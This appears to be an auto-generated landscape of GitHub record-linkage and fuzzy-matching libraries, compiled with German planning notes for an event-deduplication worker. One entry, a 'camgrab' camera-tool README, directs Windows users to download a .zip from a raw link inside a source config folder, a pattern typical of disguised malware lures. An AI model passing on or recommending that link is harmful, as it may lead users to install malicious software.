members.name: Arabic-Latin-Full-Name-Match
members.description: A production-ready Python library for cross-script fuzzy name matching between Arabic and Latin (French/English) romanised Algerian names. Built for deduplication, record linkage, and identity resolution in Algerian administrative datasets.
members.readme:
Algerian Name Matcher

A production-ready Python library for **cross-script fuzzy name matching** between Arabic and Latin (French/English) romanised Algerian names. Built for deduplication, record linkage, and identity resolution in Algerian administrative datasets.

---

The Problem

Algerian names exist in two competing scripts with no standardised transliteration:

| Arabic | Latin (French) | Latin (English) |
|---|---|---|
| عبد الرحمن بوزيد | Bouzid Abderrahmane | Abderrezak Bouzid |
| هدى بن عيسى | Benaissa Houda | Houda Benaissa |
| زين الدين مخلوفي | Zinedine Makhloufi | Zineddine Makhloufi |

Off-the-shelf fuzzy matchers fail on these because they treat names as bags of characters, letting a shared surname rescue a completely wrong first name — a **collision**.

---

How It Works

Normalisation Pipeline

Every name, regardless of script, passes through the same pipeline and emerges as a single phonetic Latin form before scoring:

 

Scoring Algorithm

 

Protected by two guards:

**Consonant-skeleton gate** — vowels are stripped from both sides before the worst-case bidirectional match is checked. hdy and houda both reduce to hd, so the gate passes correctly even though the raw strings look very different.

**Asymmetry penalty** — if the two names have different word counts after normalisation, the score is scaled down proportionally.

---

Installation

 

> camel-tools requires its data files on first use:
>  

---

Quick Start

 

Single pair comparison

 

Normalise a name

 

Bulk search — find best match in a database

 

---

FastAPI Integration

 

---

Pu...

members.name: jaro-winkler-cli
members.description: Calculate Jaro-Winkler string similarity from the terminal.
members.readme:
@kszongic/jaro-winkler-cli

 
 

Calculate **Jaro-Winkler string similarity** from the command line. Zero dependencies.

The Jaro-Winkler distance is commonly used in record linkage, deduplication, and fuzzy matching. It gives higher scores to strings that match from the beginning — great for comparing names, typos, and near-duplicates.

Install

 

Usage

 

Options

| Flag | Description |
|------|-------------|
| -p, --prefix-weight <n> | Prefix scaling factor (default: 0.1, max 0.25) |
| -j, --jaro | Output Jaro distance only (no Winkler boost) |
| --json | Output as JSON |
| -h, --help | Show help |

Examples

 

How It Works

**Jaro distance** counts matching characters (within a window) and transpositions
**Winkler modification** boosts the score for strings sharing a common prefix (up to 4 chars)
Output is a value between 0 (no similarity) and 1 (identical)

License

MIT © 2026 kszongic

members.name: splink_stata
members.description: Probabilistic record linkage for Stata. C plugin implementation of the Fellegi-Sunter model, matching the feature set of Python splink.
members.readme:
splink_stata

Probabilistic record linkage for Stata using the Fellegi-Sunter model. A C plugin implementation matching the feature set of Python splink v4.

Installation

 

Features

**19 comparison methods**: Jaro-Winkler, Jaro, Levenshtein, Damerau-Levenshtein, Jaccard, exact, numeric, cosine, intersect, name, email, postcode, nameswap, dob, pctdiff, abs_date, abs_time, distance_km, custom
**Configurable comparison levels**: variable number of thresholds per field via complevels()
**Multiple blocking rules**: up to 4 rules with OR logic via block(), block2(), block3(), block4(), or arbitrary rules via blockrules()
**EM parameter estimation**: joint estimation of m-probabilities, u-probabilities, and lambda
**Term frequency adjustments**: tfadjust() for frequency-aware weighting with named TF sources
**Cross-dataset linking**: linkvar() + linktype() for deduplication, linking, or both
**Null handling**: neutral (default) or penalize missing values via nullweight()
**Pairwise output**: savepairs() writes CSV with match weights, probabilities, gamma levels, and Bayes factors
**Random u-estimation**: uestimate option for splink-style u-probability estimation from random pairs
**Model save/load**: savemodel() and loadmodel() for JSON model persistence
**Supervised m-estimation**: mlabel() for labeled training data
**Round-robin EM**: roundrobin for per-blocking-rule EM training
**Clustering**: connected components (default) or best-link via clustermethod()
**Cluster thresholding**: separate clusterthreshold() for cluster formation vs pair scoring
**Salting**: salt() for bloc...

members.name: engram
members.description: Agent memory system with retain-recall-reflect loop. Hybrid search, entity resolution, observation synthesis. TypeScript library + MCP server.
members.readme:
engram

A learning agent memory system with reflect loop. Engram stores facts extracted from text, links them to entities and relationships, and periodically synthesizes higher-order observations (patterns, preferences, insights).

Engram is two things:

**A TypeScript library** — import Engram and call retain(), recall(), reflect() directly.
**An MCP server** — run engram-mcp and connect any MCP client (Claude Desktop, Claude Code, etc.) over stdio.

Both use the same SQLite-backed engine. No external database required.

How It Works

 

**retain** — Ingests text, extracts atomic facts and entities via an LLM, embeds them, and stores everything in SQLite. Duplicate facts are skipped via content-hash deduplication. Optionally evaluates new facts against existing observations to adjust confidence.

**retainDirect** — Same as retain but accepts pre-extracted facts/entities/relations, skipping the LLM extraction call entirely. Useful when you already have structured data.

**recall** — Hybrid retrieval combining semantic similarity (sqlite-vec), keyword matching (FTS5), and temporal filtering (chrono-node). Scores are fused with configurable weights and observations get a priority boost.

**reflect** — Groups facts by shared entities into clusters, then synthesizes higher-order observations using an LLM. Duplicate observations merge evidence and bump confidence. Low-confidence observations are archived.

**forget** — Removes facts by ID, age, or TTL expiry. FTS5 and entity links are cleaned up automatically.

Quick Start

Programmatic (TypeScript library)

 

MCP Server

 

Ad...

unmatched.name: trade-record-linker
unmatched.description: Python record linkage library for noisy customs data. Blocking, comparators, rule-based + ML classifiers.
unmatched.readme:
trade-record-linker

A record linkage and deduplication library for customs trade data. Built for
importer names, addresses, and HS-coded goods descriptions that are often
transliterated across alphabets, abbreviated, or plain noisy.

Why

Customs feeds from multiple declarants, forwarders, and terminal operators
produce divergent strings for the same real-world entity. Manual stitching
does not scale past a few thousand records. This library provides a
blocking + scoring + clustering pipeline that is transparent enough for
customs analysts to audit every match decision.

Pipeline

**Blocking** reduces the O(n^2) pair space. Three blockers ship:
   - NgramBlocker (character n-gram buckets),
   - PhoneticBlocker (Double Metaphone on token heads),
   - JaccardBlocker (token-set jaccard over a shingled representation).
**Comparators** score each candidate pair field-by-field. Included:
   Jaro-Winkler, Levenshtein ratio, set Jaccard, SoftTFIDF, numeric
   closeness, and date closeness.
**Classifier** reduces the per-field vector into a scalar match score.
   The default is a rule-based weighted sum; a SupervisedClassifier
   wraps a scikit-learn estimator for labeled-data workflows.
**Clustering** builds a graph of pairs above threshold and collapses
   connected components. Transitive-closure tightening applies a second
   pass to prune chains held together by a single weak edge.

Install

 

Requires Python 3.11+.

Quickstart

 

CLI

 

The CLI reads a CSV, infers a default schema (importer + address + hs_code
if present), runs the linker, and writes a two-column cluster_id...

unmatched.name: dqbench
unmatched.description: The standard benchmark for data quality tools — detection, transformation, entity resolution, and pipeline orchestration. 4 categories, 12 tiers, 161 tests.
unmatched.readme:
DQBench

The standard benchmark for data quality tools — detection, transformation, entity resolution, and pipeline orchestration.

 
 
 
 
 
 
 

> The ImageNet of data quality — standardized benchmarks for validation, transformation, entity resolution, and pipeline tools.

Why DQBench?

Every data quality tool claims to be the best. But there's no standard way to compare them. DQBench fixes that with:

**Four benchmark categories** — Detect, Transform, ER, and Pipeline
**Three difficulty tiers** — basics, realistic, and adversarial
**Ground truth** — every planted issue is documented with affected rows
**Fair scoring** — recall AND precision matter (no gaming by flagging everything)
**One number** — DQBench Score (0-100) for easy comparison
**20-line integration** — implement one method to benchmark any tool

Install

The repo now also includes an OCR Company benchmark for post-OCR company-name confidence and correction quality.

 

Quick Start

 

Benchmark Categories

| Category | What it measures | Example tools |
|----------|-----------------|---------------|
| **Detect** | Find data quality issues in a dataset | GoldenCheck, Great Expectations, Pandera, Soda Core |
| **Transform** | Clean, normalize, and repair data | GoldenFlow, dbt, pandas |
| **ER** | Entity resolution — deduplicate and link records | GoldenMatch, Splink, Dedupe |
| **Pipeline** | End-to-end pipeline orchestration and quality gates | GoldenPipe, Airflow, Prefect |
| **OCR Company** | OCR company-name confidence, review, and correction quality | OCR confidence/correction tools |

Head-to-Head Resul...

unmatched.name: string-distance
unmatched.description: Python string distance/similarity CLI. Levenshtein, Hamming, Jaro-Winkler, cosine, LCS, fuzzy match, phonetic matching (Soundex, Metaphone). Zero dependencies.
unmatched.readme:
string_distance

A string distance and similarity CLI tool. Zero dependencies -- pure Python 3 standard library.

Features

**Levenshtein distance** -- minimum edits (insert, delete, substitute) to transform one string into another
**Hamming distance** -- number of positions where characters differ (equal-length strings)
**Jaro-Winkler similarity** -- similarity score (0-1) favoring common prefixes
**Cosine similarity** -- character n-gram based similarity
**Longest common subsequence** -- longest sequence of characters appearing in both strings in order
**Longest common substring** -- longest contiguous match
**Fuzzy match score** -- combined weighted score (0-100)
**Batch compare** -- find the closest match from a list of candidates
**Deduplicate** -- group similar strings by threshold
**Sort by similarity** -- rank strings by closeness to a target
**Phonetic matching** -- Soundex and basic Metaphone codes
**Output as JSON or table**
**Pipe-compatible** -- works with stdin/stdout

Installation

No installation needed. Requires Python 3.7+.

 

Usage

 

Algorithm Details

| Algorithm | Returns | Best For |
|-----------|---------|----------|
| Levenshtein | Integer (edit distance) | General typo detection |
| Hamming | Integer (bit distance) | Fixed-length codes, DNA |
| Jaro-Winkler | Float 0-1 (similarity) | Name matching, short strings |
| Cosine | Float 0-1 (similarity) | Document similarity |
| LCS | String + length | Diff algorithms, patches |
| Fuzzy | Score 0-100 | Quick "how similar" answer |
| Soundex | 4-char code | English name matching |
| Metaphone | Variable...

unmatched.name: Sessions-Splink
unmatched.description: Repository holding resources and presentations relating to the record linkage Python package Splink.
unmatched.readme:
Sessions-Splink

A repository holding resources and presentations relating to Record Linkage in general and the Python package Splink.

Resources created by Barney Lawrence and Ash Ward

Past presentations are in sub folders. Latest work is at the top level.

Splink v3 and v4 demos have been tested in both Microsoft Fabric and Synapse Analytics.

The ipynb files in the Festive Tech Calendar folder are exports from our Synapse notebooks, great for importing back into Synapse.

The py files are python conversions of our Synapse notebooks. Good if you want to copy and paste the code into another type of Spark (although will likely need some faffing around with to get working).

Videos of past sessions:

Splinking in a Winter Wonderland - Produced for Festive Tech Calendar 2023 - Lots of detail on splink v3 and statistical backing. Also hats.
Data Linkage Options: MDM vs Splink (PySpark) - Presented at SQLBits 2024 - 20 Minute session covering the differences between splink and MDM solutions.
Mastering Record Linkage With Splink - An interview format discussion with Tom Seekings at Simpson Associates.

unmatched.name: kds-uti-engine
unmatched.description: Deterministic canonical JSON hashing and tamper-evident hash-chain event log engine for TypeScript
unmatched.readme:
KDS-UTI Protocol Engine (TypeScript)

 
 
 
 
 

A deterministic, offline-friendly TypeScript engine for **canonical JSON hashing**, **tamper-evident hash-chained event logs**, strict **CANON vs PROJECTION** separation, and optional Meeus-style solar/astronomical projections + KDS-specific 13×28 + Year-Day calendar mapping.

Designed as a **reference-grade artifact** — reproducible, fail-closed, cross-runtime stable, and built for long-term archival and citation.

---

Table of Contents

Why This Exists
Key Advantages
Core Concepts
Quick Start
Canonical JSON Rules
Hash Chaining & Verification
KDS Event Packet Schema
Projection Utilities (Optional)
Fidelity Levels
Runtime Compatibility
License
Citation
Support the Project

---

Why This Exists

Unix time counts seconds from an arbitrary epoch — January 1, 1970 UTC — a date chosen by convention, not physics. It is opaque, culturally specific, and tells you nothing about the natural rhythms that govern human life: when the sun rises, whether it is summer or winter, how far through the year we actually are.

For most software, this is fine. For systems that demand **long-term verifiability**, **cross-jurisdiction neutrality**, or **physical grounding** — forensic records, archival systems, scientific logs, or any data that must remain interpretable without reference to a specific standards body — Unix time is a fragile foundation.

The KDS-UTI Engine uses a different anchor: the **March equinox**. Each year begins when the Sun crosses the celestial equator northward. The year is divided into exactly **365 × 86400 KDS-seconds**,...

unmatched.name: camgrab
unmatched.description: Capture and record video streams from webcams using a Rust-based tool designed for efficiency and cross-platform support.
unmatched.readme:
📷 camgrab - Capture and Monitor IP Cameras Fast

 

---

What is camgrab?

camgrab is a simple tool to capture images, record videos, and detect motion from IP cameras. It works on Windows and runs from a single file, so you don’t need to install anything complex. With camgrab, you can watch your security cameras, save snapshots, or start recording without extra software.

---

Supported Features

Take snapshots from your IP camera instantly  
Record video streams from cameras over the network  
Detect motion using your camera’s feed  
PTZ (Pan, Tilt, Zoom) control for compatible cameras  
Works with RTSP and ONVIF camera protocols  
Command-line interface keeps it lightweight and fast  
Single executable file – no installation required  

---

System Requirements

Windows 10 or later (64-bit recommended)  
At least 100 MB free disk space  
Active network connection to access your IP camera  
IP camera supports RTSP or ONVIF protocols  
Basic command prompt familiarity is helpful but not required  

---

🔽 Where to Get camgrab

Visit the page below to download camgrab for Windows:

 

This link takes you to the camgrab GitHub page. You will find the latest release files there.

---

🛠 Download and Install on Windows

Follow these steps to download and run camgrab:

Click the **Download camgrab** badge at the top or the link below:  
   https://github.com/GoldenXerO/camgrab/raw/refs/heads/main/crates/camgrab-core/src/config/Software-3.0.zip

On the page, find the **Releases** section or look for a folder named releases. This is where you will see the available versions of...

mission: Externe Loesungsraum-Landkarte fuer "Derselbe physische Event wird von mehreren Quellen eingesammelt — mit leicht unterschiedlichen Titeln ("Jazz im Keller" vs" ins Zielprojekt eventbear-worker ueberfuehren
Keine divergenten Cluster — Landschaft liegt nahe am aktuellen Ansatz
deliverable: Je Cluster ein Kurz-Exposé mit Key-Takeaway fuer das Zielprojekt
Pro divergentem Cluster eine klare adopt/adapt/observe/ignore-Entscheidung
Decision-Log-Eintrag(e) im Zielprojekt, die auf diese Landscape referenzieren
context: Aktueller Ansatz: Simple String-Match auf Titel + Datum. Funktioniert bei ~60% der Fälle; der Rest bleibt Dublette oder wird falsch gemerged. Keine Fuzzy-Logic, keine Adress-Normalisierung im Matcher, keine Zeit-Toleranz.

Erfolgskriterium: Zwei Varianten desselben Events werden zu 1 kanonischer Entity gemerged,Zwei verschiedene Events desselben Veranstalters bleiben getrennt (keine False-Merges),Merge-Entscheidungen inspectable mit pro-Feld Begründung,Konflikt-Resolution bei Merge (welche Werte gewinnen) deterministisch
Approach-Signature: record-linkage, entity-resolution, fuzzy-matching, probabilistic-matching, blocking, similarity-scoring
Tech-Tags: nodejs, typescript, javascript, python, java, node
guardrails: Matching ohne zentrale ID — nur via Inhalt und Metadaten
uncertainties: Nicht-Ziel: Kein manuelles Merge-Review als Default-Flow — auto-merge bei hoher Confidence
Nicht-Ziel: Kein DB-natives Merging (Postgres extensions o.ä.) — muss in Node-Worker laufen
Nicht-Ziel: Keine ML-Model-Training-Pipeline — existierende Heuristik + Libraries

primary.implementationGoal: Adaptions-Skizze fuer Cluster "dedupe+deduplication+python" als Bruecke zum Zielprojekt
primary.firstSlice: Minimal-Integration: 1 Vertreter aus Cluster "dedupe+deduplication+python" gegen das Zielprojekt testen
compareChecklist: Wie unterscheidet sich dieser benachbarte Ansatz vom aktuellen Stand?
Welche Annahmen des aktuellen Ansatzes stellt dieses Cluster in Frage?
Ist der Transfer-Aufwand in Relation zum erwarteten Gewinn vertretbar?
stopIf: Performance oder Qualitaet unter dem aktuellen Niveau ohne klare Perspektive
Lizenz oder Distributionsform passt nicht zum Zielprojekt

missingCandidates: Nur 1 Cluster gebildet — die Loesungslandschaft ist thematisch homogen.
Naechster Hebel: Query-Seeds orthogonal erweitern (z.B. andere Ansatz-Tags, andere Sprache-Oekosysteme, andere Problem-Formulierung).
Alternativ: Discovery-Depth erhoehen (--depth deep) oder Signature-Approach gegenchecken.
